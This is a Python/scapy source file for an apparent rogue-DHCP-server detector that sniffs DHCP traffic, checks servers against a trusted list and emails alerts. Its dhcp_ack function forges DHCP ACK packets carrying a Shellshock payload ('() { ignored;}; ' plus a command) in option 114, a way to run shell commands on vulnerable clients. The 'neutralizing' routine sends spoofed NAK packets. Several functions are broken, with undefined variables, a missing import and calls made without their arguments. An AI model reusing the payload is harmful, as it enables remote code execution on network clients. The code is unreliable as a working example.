from scapy.all import *
import json
import logging
from threading import Thread
import ipaddress

#BOOTP
#siaddr = DHCP server ip
#yiaddr = ip offered to client
#xid = transaction id 
#chaddr = clients mac address in binary format

DHCPTypes = {
	"discover": 1,
	"offer": 2,
	"request": 3,
	#TODO 4: "decline",
	"ack": 5,
	#TODO 6: "nak",
	"release": 7,
	#TODO 8: "inform",
	#TODO 9: "force_renew",
	#TODO 10: "lease_query",
	#TODO 11: "lease_unassigned",
	#TODO 12: "lease_unknown",
	#TODO 13: "lease_active",
}


class DHCPLock:
	def __init__(self, filename=None, interfaces=None, serverIP=None, serverMAC=None):
		self.dhcplock_filter = 'udp and (port 67 or port 68)'
		self.trusted_servers = []
		self.main_server_ip = ''
		self.main_server_mac = ''
		self.clients_to_cure = []
		self.rogue_servers = []
		self.foundRogue = False
		self.mailIsAlreadySent = False
		self.mail_mailOn = None
		self.mail_sender = ''
		self.mail_receiver = ''
		self.mail_domain = ''
		self.mail_password = ''
		self.method1_thread = None
		self.method2_thread = None
		self.ip_addr = '192.168.94.0'
		self.subnet_mask = '255.255.255.0'
		self.mail_thread = None
		if filename is not None:
			self.interfaces = self.read_file(filename)
		
		
	def read_file(self, filename):
		f = open(filename, 'r')
		data = json.loads(f.read())
		interfaces = data['configDetails']['interfaces']
		ip, mac = data['configDetails']['servers'][0]['serverIP'], data['configDetails']['servers'][0]['serverMAC']
		self.trusted_servers.append((mac, ip))
		self.main_server_ip = ip
		self.main_server_mac = mac
		if data['configDetails']['servers'][0]['mailOn'] == True:
			self.mail_sender = data['configDetails']['servers'][0]['emailSender']
			self.mail_domain = data['configDetails']['servers'][0]['emailDomain']
			self.mail_password = data['configDetails']['servers'][0]['emailPassword']
			self.mail_receiver = data['configDetails']['servers'][0]['emailReceiver']
			self.mail_mailOn = data['configDetails']['servers'][0]['mailOn']
		f.close()
		return interfaces
		

	def dhcp_ack(self, host_ip, raw_mac, xid, command):
		mac_addr = resp[Ether].src
		raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
		packet = Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') 
		packet /= IP(src=host_ip, dst='255.255.255.255')
		packet /= UDP(sport=67, dport=68)
		packet /= BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr=host_ip, xid=xid)
		packet /= DHCP(options=[("message-type", "ack"),
			('server_id', '192.168.2.1'),
			('subnet_mask', '255.255.255.0'),
			('router', '192.168.2.5'),
			('lease_time', 172800),
			('renewal_time', 86400),
			('rebinding_time', 138240),
			(114, "() { ignored;}; " + command),
			"end"])
		return packet


	def dhcp_nack(self, raw_mac, xid, command):
		main_server_mac = self.main_server_mac
		main_server_ip = self.main_server_ip
		packet = Ether(src=main_server_mac, dst=rogue_server_mac) 
		packet /= IP(src=main_server_ip, dst='255.255.255.255')
		packet /= UDP(sport=67, dport=68)
		packet /= BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr=main_server_ip, xid=xid)
		packet /= DHCP(options=[("message-type", "nak"),('server_id', main_server_ip),"end"])
		return packet	


	# Fixup function to extract dhcp_options by key
	def get_option(self, dhcp_options, key):
		must_decode = ['hostname', 'domain', 'vendor_class_id', 'message-type']
		try:
			for i in dhcp_options:
				if i[0] == key:
			# If DHCP Server Returned multiple name servers 
			# return all as comma seperated string.
					if key == 'name_server' and len(i) > 2:
					    return ",".join(i[1:])
				# domain and hostname are binary strings,
				# decode to unicode string before returning
					elif key in must_decode:
					    return i[1].decode()
					else: 
					    return i[1]        
		except:
			pass	


	def check_for_rogue_server(self,server_ip,server_mac):
		print(f'CHECKING a server with {server_ip} and {server_mac}')
		s_tuple = (server_mac, server_ip)
		if s_tuple not in self.trusted_servers:
			logging.warning('[***] POTENTIAL DHCP ROGUE SERVER FOUND [***]')
			self.foundRogue = True
			if self.mailIsAlreadySent == False:
				self.mail_thread = Thread(target=self.sending_email)
				self.mail_thread.start()
				self.mailIsAlreadySent = True
		else: 
			logging.info('[***] DHCP SERVER FOUND [***]')	
		
		
	def dhcp(self,resp):
			if resp.haslayer(DHCP):
				mac_addr = resp[Ether].src
				xid = resp[BOOTP].xid

				# ---- DHCP DISCOVER ----
				if resp[DHCP].options[0][1] == 1:
					hostname = self.get_option(resp[DHCP].options, 'hostname')
					server_id = resp[DHCP].options[1][1]
					ciaddr = resp[BOOTP].ciaddr
					logging.info(f"[*] Got new DHCP DISCOVER of {ciaddr} ({mac_addr}) xid: {hex(xid)}")
					logging.info(f"Host {hostname} with IP {ciaddr}({mac_addr}) asked {server_id} for an IP")
					#logging.info(resp.show())


				# ---- DHCP OFFER ----
				elif resp[DHCP].options[0][1] == 2:
					ciaddr = resp[BOOTP].ciaddr
					logging.info(f"[*] Got new DHCP OFFER of {ciaddr} ({mac_addr}) xid: {hex(xid)}")
					subnet_mask = self.get_option(resp[DHCP].options, 'subnet_mask')
					lease_time = self.get_option(resp[DHCP].options, 'lease_time')
					router = self.get_option(resp[DHCP].options, 'router')
					name_server = self.get_option(resp[DHCP].options, 'name_server')
					domain = self.get_option(resp[DHCP].options, 'domain')

					logging.info(f"DHCP Server {resp[IP].src} ({mac_addr}) offered {resp[BOOTP].yiaddr}")
					logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: {lease_time}, router: {router}, name_server: {name_server}, domain: {domain}")
					#logging.info(resp.show())
					self.check_for_rogue_server(resp[IP].src, mac_addr)


				# ---- DHCP REQUEST ----
				elif resp[DHCP].options[0][1] == 3:
					logging.info("[*] Got new DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
					requested_addr = self.get_option(resp[DHCP].options, 'requested_addr')
					hostname = self.get_option(resp[DHCP].options, 'hostname')
					logging.info(f"Host {hostname} ({resp[Ether].src}) requested {requested_addr}")


				# ---- DHCP DECLINE ----
				elif resp[DHCP].options[0][1] == 4:
					logging.info("[*] Got new DHCP DECLINE from: " + mac_addr + " xid: " + hex(xid))
					logging.info(f"Host {resp[IP].src} ({resp[Ether].src}) declined")

					
				# ---- DHCP ACK ----
				elif resp[DHCP].options[0][1] == 5:
					logging.info("[*] Got new DHCP ACKNOLEDGMENT from: " + mac_addr + " xid: " + hex(xid))
					subnet_mask = self.get_option(resp[DHCP].options, 'subnet_mask')
					lease_time = self.get_option(resp[DHCP].options, 'lease_time')
					router = self.get_option(resp[DHCP].options, 'router')
					name_server = self.get_option(resp[DHCP].options, 'name_server')
					domain = self.get_option(resp[DHCP].options, 'domain')


					logging.info(f"DHCP Server {resp[IP].src} ({resp[Ether].src}) acknoledged {resp[BOOTP].yiaddr}")
					logging.info(f"DHCP Options: subnet_mask: {subnet_mask}, lease_time: {lease_time}, router: {router}, name_server: {name_server}, domain: {domain}")
					#logging.info(resp.show())
					self.check_for_rogue_server(resp[IP].src, mac_addr)
					  

				# ---- DHCP NACK ----
				elif resp[DHCP].options[0][1] == 6:
					logging.info("[*] Got new DHCP NACK from: " + mac_addr + " xid: " + hex(xid))
					logging.info(f"Host {resp[IP].src} ({resp[Ether].src}) NACK")
					
			
				# ---- DHCP RELEASE ----
				elif resp[DHCP].options[0][1] == 7:
					#print(resp.show())
					ciaddr = resp[BOOTP].ciaddr
					logging.info(f"[*] Got new DHCP RELEASE of {ciaddr} {mac_addr} xid: {hex(xid)}")
					server_id = resp[DHCP].options[1][1]
					hostname = self.get_option(resp[DHCP].options, 'hostname')
					#TODO: check for rogue DHCP here (for certain server_id)
					logging.info(f"Host {hostname} with IP {ciaddr} ({mac_addr}) released to {server_id}")
					

				# ---- DHCP NACK ----
				elif resp[DHCP].options[0][1] == 8:
					logging.info("[*] Got new DHCP INFORM from: " + mac_addr + " xid: " + hex(xid))
					logging.info(f"Host {resp[IP].src} ({resp[Ether].src}) informed")	

				else: 	
					print(f"I dont know this DHCP packet", resp[DHCP].options[0][1])
					print(resp.show())
		

	def sending_email(self):
		if self.mail_mailOn:
			import smtplib
			from email.mime.text import MIMEText
			print("sending an email.....")

			# get the data
			sender = self.mail_sender
			receiver = self.mail_receiver
			domain = self.mail_domain
			password = self.mail_password

			# build the email
			subject = "DHCP rogue server found!!!"
			text = """A rogue DHCP server has been found in your network.
	Please check the local log file for more info."""	
			message = MIMEText(text, 'plain')
			message["Subject"] = subject
			message["From"] = sender	
			message["To"] = receiver
			# try to send it
			try: 
				smptObj = smtplib.SMTP(domain,587)
				smptObj.ehlo()
				smptObj.starttls()
				smptObj.login(sender, password)
				smptObj.sendmail(sender, receiver, message.as_string())
				print("\nSuccessfully sent email\n")
			except smtplib.SMTPException as e:
				print('\nError: unable to send email\n',e)
			finally: 
				smptObj.quit()
		else:
			print("\nSendinf an email is disabled\n")			


	def neutralizing_method1(self):
		logging.info("\n[*] [*] Starting neutralizing method1 ...\n")
		pass			


	def neutralizing_method2(self):
		logging.info("\n[*] [*] Starting neutralizing method2...\n")
		ip_network = str(self.ip_addr + '/' + self.subnet_mask)
		arr = [str(ip) for ip in ipaddress.IPv4Network(ip_network)]
		dhcp_nack_packet = self.dhcp_nack()
		sendp(dhcp_nack_packet)
		for ip in ipaddress.IPv4Network(ip_network):
			print(str(ip))
			#self.dhcp_ack(str(ip))
		pass	


	def run(self):
		logging.info("[*] Waiting for a DHCP Packets...")
		sniff(iface=self.interfaces, filter=self.dhcplock_filter, prn=self.dhcp, store=0)	
			

	def start(self):
		self.neutralizing_method2()
		thread = Thread(target=self.run)
		thread.start()
